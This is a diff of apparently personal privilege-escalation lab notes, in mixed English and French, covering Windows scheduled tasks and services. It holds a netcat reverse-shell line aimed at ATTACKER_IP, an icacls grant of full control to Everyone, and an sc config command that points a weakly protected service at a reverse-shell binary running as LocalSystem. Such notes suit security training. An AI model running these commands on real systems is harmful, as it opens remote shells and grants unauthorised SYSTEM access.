@@ -1,4 +1,8 @@
-# check permissions on a file
+# acess control
+```
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+```
+## check permissions on a file
 ```
 icacls c:\tasks\schtask.bat
 ```
@@ -56,5 +60,37 @@ echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\<taskfile>
 ```
 schtasks /run /tn <taskname>
 ```
+# service
+## start or stop
+```
+sc stop THMService
+sc start THMService
+```
+## check service configuration
+Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
 
+Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
 
+To better understand the structure of a service, let's check the apphostsvc service configuration with the sc qc command:
+```
+sc qc <servicename>
+```
+## reconfigure service
+Pour rechercher un service DACL à partir de la ligne de commande, vous pouvez utiliser Accesschk de la suite Sysinternals. Pour votre commodité, une copie est disponible à l'adresse C:\\tools. La commande pour vérifier la DACL du service thmservice est :
+`C:\tools\AccessChk> accesschk64.exe -qlc thmservice
+  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS`
+Ici, nous pouvons voir que le BUILTIN\\Usersgroupe dispose de l'autorisation SERVICE_ALL_ACCESS, ce qui signifie que n'importe quel utilisateur peut reconfigurer le service.
+```
+C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
